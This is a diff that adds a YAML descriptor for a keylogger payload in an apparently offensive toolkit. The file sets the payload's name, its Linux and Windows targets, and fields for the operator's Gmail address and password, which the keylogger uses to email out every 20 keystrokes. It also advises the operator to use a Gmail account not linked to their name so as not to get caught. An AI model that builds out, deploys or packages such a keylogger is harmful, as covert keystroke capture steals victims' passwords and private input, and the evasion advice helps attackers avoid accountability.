@@ -1,0 +1,20 @@
+# About Payload
+name: keylogger_email
+version: "1.0.0"
+license: Apache Software License 2.0 # Not required
+description: sends keystroeks every 20 keys from your gmail to your gmail
+# requireing version 1.4.6 because fields doesnt work on ZKit-Framework v1.4.5
+required_version: 1.4.6 # Not required
+fulldescription: |
+  Its a keylogger that sends evry 20 keys from your gmail to your gmail
+  dont use your personal gmail or a gmail that your name or your nickname is 
+  in it . do it if you want to get caught
+homepage: https://gihub.com/000Zer000/ZKit-Framework # Not required
+# About Author
+author: 000Zer000
+profile: https://gihub.com/000Zer000 # Not required
+fields: ["yourgmail", "yourpassword"]
+# About Payload
+payloads: [linux, windows]
+level: basic # Not required
+# Basic , basic , BASIC are the same
